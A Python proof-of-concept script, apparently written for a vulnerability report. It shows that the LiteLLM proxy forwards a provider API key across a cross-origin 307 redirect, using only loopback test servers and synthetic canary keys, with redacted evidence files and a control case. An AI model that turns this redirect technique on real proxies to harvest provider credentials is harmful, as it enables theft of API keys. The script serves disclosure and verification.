#!/usr/bin/env python3
"""Reproduce LiteLLM pass-through cross-origin redirect credential forwarding.

Synthetic canaries only. No live provider credentials are used. The script starts
the real LiteLLM proxy CLI in front of deterministic loopback HTTP servers:

- trigger: the configured origin answers 307 to a second origin (the sink)
- control: the configured origin answers 200 directly

The proxy receives OPENAI_API_BASE=<origin> and OPENAI_API_KEY=<synthetic canary>.
The provider `api-key` header is the credential under test. Every canary is
replaced with a named marker before any evidence file is written.
"""
from __future__ import annotations

import argparse
import json
import os
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import httpx

ROOT = Path(__file__).resolve().parent
PROVIDER_KEY = "sk-CANARY_PROVIDER_KEY_108_a1b2c3d4e5f6"
MASTER_KEY = "sk-CANARY_MASTER_KEY_108_f6e5d4c3b2a1"
SALT_KEY = "sk-CANARY_SALT_KEY_108_0123456789ab"
MARKERS = {
    PROVIDER_KEY: "[CANARY_PROVIDER_KEY]",
    MASTER_KEY: "[CANARY_MASTER_KEY]",
    SALT_KEY: "[CANARY_SALT_KEY]",
}


def sanitize(value: str) -> str:
    for secret, marker in MARKERS.items():
        value = value.replace(secret, marker)
    return value


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return int(s.getsockname()[1])


def http_raw(method: str, path: str, headers: list[tuple[str, str]], body: bytes) -> str:
    lines = [f"{method} {path} HTTP/1.1"]
    lines.extend(f"{k}: {v}" for k, v in headers)
    return "\r\n".join(lines) + "\r\n\r\n" + body.decode("utf-8", "replace")


def record_jsonl(record: dict) -> str:
    headers = {str(k): str(v) for k, v in record["headers"]}
    return json.dumps(
        {"headers": headers, "request_raw": record["raw"]}, sort_keys=True
    ) + "\n"


class Recorder:
    def __init__(self) -> None:
        self.records: list[dict] = []
        self.lock = threading.Lock()

    def add(self, record: dict) -> None:
        with self.lock:
            self.records.append(record)


def completion_body(model: str = "mock") -> bytes:
    payload = {
        "id": "chatcmpl-108",
        "object": "chat.completion",
        "created": 1700000000,
        "model": model,
        "choices": [
            {
                "index": 0,
                "message": {"role": "assistant", "content": "ok"},
                "finish_reason": "stop",
            }
        ],
        "usage": {"prompt_tokens": 1, "completion_tokens": 1, "total_tokens": 2},
    }
    return json.dumps(payload).encode()


class BaseHandler(BaseHTTPRequestHandler):
    recorder: Recorder

    def _record(self, body: bytes) -> None:
        headers = [[k, v] for k, v in self.headers.items()]
        self.recorder.add(
            {
                "method": self.command,
                "path": self.path,
                "headers": headers,
                "body": body.decode("utf-8", "replace"),
                "raw": http_raw(self.command, self.path, headers, body),
            }
        )

    def _read_body(self) -> bytes:
        length = int(self.headers.get("content-length") or 0)
        return self.rfile.read(length) if length else b""

    def _send_json(self, status: int = 200) -> None:
        body = completion_body()
        self.send_response(status)
        self.send_header("content-type", "application/json")
        self.send_header("content-length", str(len(body)))
        self.send_header("connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self) -> None:  # noqa: N802
        body = self._read_body()
        self._record(body)
        self.dispatch(body)

    def do_GET(self) -> None:  # noqa: N802
        body = self._read_body()
        self._record(body)
        self.dispatch(body)

    def dispatch(self, body: bytes) -> None:
        self._send_json(200)

    def log_message(self, *_args: object) -> None:
        return


class DirectHandler(BaseHandler):
    def dispatch(self, body: bytes) -> None:
        self._send_json(200)


class SinkHandler(BaseHandler):
    def dispatch(self, body: bytes) -> None:
        self._send_json(200)


class RedirectHandler(BaseHandler):
    sink_port: int

    def dispatch(self, body: bytes) -> None:
        self.send_response(307)
        self.send_header("location", f"http://127.0.0.1:{self.sink_port}/sink")
        self.send_header("content-length", "0")
        self.send_header("connection", "close")
        self.end_headers()


def start_server(
    handler: type[BaseHandler], recorder: Recorder, **attrs: object
) -> ThreadingHTTPServer:
    cls = type(handler.__name__ + "Bound", (handler,), {"recorder": recorder, **attrs})
    server = ThreadingHTTPServer(("127.0.0.1", 0), cls)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def wait_ready(url: str, proc: subprocess.Popen, log_path: Path, timeout: float = 120.0) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if proc.poll() is not None:
            tail = log_path.read_text(errors="replace")[-4000:] if log_path.exists() else ""
            raise RuntimeError(f"proxy exited early ({proc.returncode}):\n{tail}")
        try:
            response = httpx.get(url, timeout=2.0)
            if response.status_code < 500:
                return
        except Exception:
            pass
        time.sleep(0.5)
    tail = log_path.read_text(errors="replace")[-4000:] if log_path.exists() else ""
    raise RuntimeError(f"proxy not ready after {timeout}s:\n{tail}")


def start_proxy(
    port: int, base: str, log_path: Path, litellm_bin: str
) -> subprocess.Popen:
    env = os.environ.copy()
    env.update(
        {
            "LITELLM_MASTER_KEY": MASTER_KEY,
            "LITELLM_SALT_KEY": SALT_KEY,
            "OPENAI_API_BASE": base,
            "OPENAI_API_KEY": PROVIDER_KEY,
            "LITELLM_LOG": "ERROR",
            "LITELLM_MODE": "PRODUCTION",
        }
    )
    log = log_path.open("w")
    proc = subprocess.Popen(
        [
            litellm_bin,
            "--config",
            str(ROOT / "config.yaml"),
            "--host",
            "127.0.0.1",
            "--port",
            str(port),
            "--num_workers",
            "1",
        ],
        cwd=str(ROOT),
        env=env,
        stdout=log,
        stderr=subprocess.STDOUT,
        start_new_session=True,
    )
    proc._kairo_log = log  # type: ignore[attr-defined]
    return proc


def stop_proxy(proc: subprocess.Popen) -> None:
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except Exception:
        proc.terminate()
    try:
        proc.wait(timeout=10)
    except Exception:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except Exception:
            proc.kill()
    log = getattr(proc, "_kairo_log", None)
    if log is not None:
        log.close()


def write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(sanitize(content))


def has_header(record: dict, name: str, needle: str) -> bool:
    return any(
        str(k).lower() == name and needle in str(v) for k, v in record["headers"]
    )


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--output-dir",
        type=Path,
        default=ROOT / "repro-output",
        help="directory for sanitized evidence and proxy logs",
    )
    parser.add_argument(
        "--litellm-bin",
        default=os.environ.get("LITELLM_BIN") or shutil.which("litellm") or "",
        help="path to the litellm proxy CLI",
    )
    args = parser.parse_args()
    litellm_bin = args.litellm_bin
    if not litellm_bin or not Path(litellm_bin).is_file():
        raise SystemExit("--litellm-bin must point to the litellm proxy CLI")
    evidence = args.output_dir.resolve()
    if evidence == ROOT:
        raise SystemExit("--output-dir must not be the transcript directory")
    if evidence.exists():
        for old in evidence.rglob("*"):
            if old.is_file():
                old.unlink()
    evidence.mkdir(parents=True, exist_ok=True)

    sink_rec = Recorder()
    redirect_rec = Recorder()
    direct_rec = Recorder()

    sink = start_server(SinkHandler, sink_rec)
    sink_port = sink.server_address[1]
    redirect = start_server(RedirectHandler, redirect_rec, sink_port=sink_port)
    redirect_port = redirect.server_address[1]
    direct = start_server(DirectHandler, direct_rec)
    direct_port = direct.server_address[1]

    trigger_port = free_port()
    control_port = free_port()
    trigger_proc = start_proxy(
        trigger_port,
        f"http://127.0.0.1:{redirect_port}",
        evidence / "proxy-trigger.log",
        litellm_bin,
    )
    control_proc = start_proxy(
        control_port,
        f"http://127.0.0.1:{direct_port}",
        evidence / "proxy-control.log",
        litellm_bin,
    )

    request_body = json.dumps(
        {"model": "mock", "messages": [{"role": "user", "content": "hello"}]}
    )
    client_headers = {
        "authorization": f"Bearer {MASTER_KEY}",
        "content-type": "application/json",
    }

    try:
        wait_ready(
            f"http://127.0.0.1:{trigger_port}/health/liveliness",
            trigger_proc,
            evidence / "proxy-trigger.log",
        )
        wait_ready(
            f"http://127.0.0.1:{control_port}/health/liveliness",
            control_proc,
            evidence / "proxy-control.log",
        )

        for label, port in (("trigger", trigger_port), ("control", control_port)):
            for run in range(1, 6):
                origin_rec = redirect_rec if label == "trigger" else direct_rec
                before_origin = len(origin_rec.records)
                before_sink = len(sink_rec.records)
                url = f"http://127.0.0.1:{port}/openai/v1/chat/completions"
                with httpx.Client(timeout=30.0, follow_redirects=False) as client:
                    response = client.post(
                        url, headers=client_headers, content=request_body
                    )
                client_request = http_raw(
                    "POST",
                    "/openai/v1/chat/completions",
                    [[k, v] for k, v in client_headers.items()],
                    request_body.encode(),
                )
                client_response = (
                    f"HTTP/1.1 {response.status_code}\r\n"
                    + "\r\n".join(f"{k}: {v}" for k, v in response.headers.items())
                    + "\r\n\r\n"
                    + response.text
                )
                run_dir = evidence / label / f"run-{run:02d}"
                run_dir.mkdir(parents=True, exist_ok=True)
                write(run_dir / "client-request.http", client_request)
                write(run_dir / "client-response.http", client_response)

                new_origin = origin_rec.records[before_origin:]
                new_sink = sink_rec.records[before_sink:]
                for i, record in enumerate(new_origin, 1):
                    write(
                        run_dir / f"upstream-origin-{i:02d}.http",
                        record["raw"],
                    )
                for i, record in enumerate(new_sink, 1):
                    write(
                        run_dir / f"upstream-sink-{i:02d}.http",
                        record["raw"],
                    )
                write(
                    run_dir / "origin.jsonl",
                    "".join(record_jsonl(record) for record in new_origin),
                )
                write(
                    run_dir / "sink.jsonl",
                    "".join(record_jsonl(record) for record in new_sink),
                )

                result = {
                    "run": run,
                    "client_status": response.status_code,
                    "origin_hits": len(new_origin),
                    "sink_hits": len(new_sink),
                    "origin_api_key": any(
                        has_header(record, "api-key", PROVIDER_KEY)
                        for record in new_origin
                    ),
                    "origin_authorization": any(
                        has_header(record, "authorization", PROVIDER_KEY)
                        for record in new_origin
                    ),
                    "sink_api_key": any(
                        has_header(record, "api-key", PROVIDER_KEY)
                        for record in new_sink
                    ),
                    "sink_authorization": any(
                        has_header(record, "authorization", PROVIDER_KEY)
                        for record in new_sink
                    ),
                }
                write(run_dir / "result.json", json.dumps(result, indent=2) + "\n")
                print(label, run, json.dumps(result))
    finally:
        stop_proxy(trigger_proc)
        stop_proxy(control_proc)
        sink.shutdown()
        redirect.shutdown()
        direct.shutdown()

    return 0


if __name__ == "__main__":
    sys.exit(main())
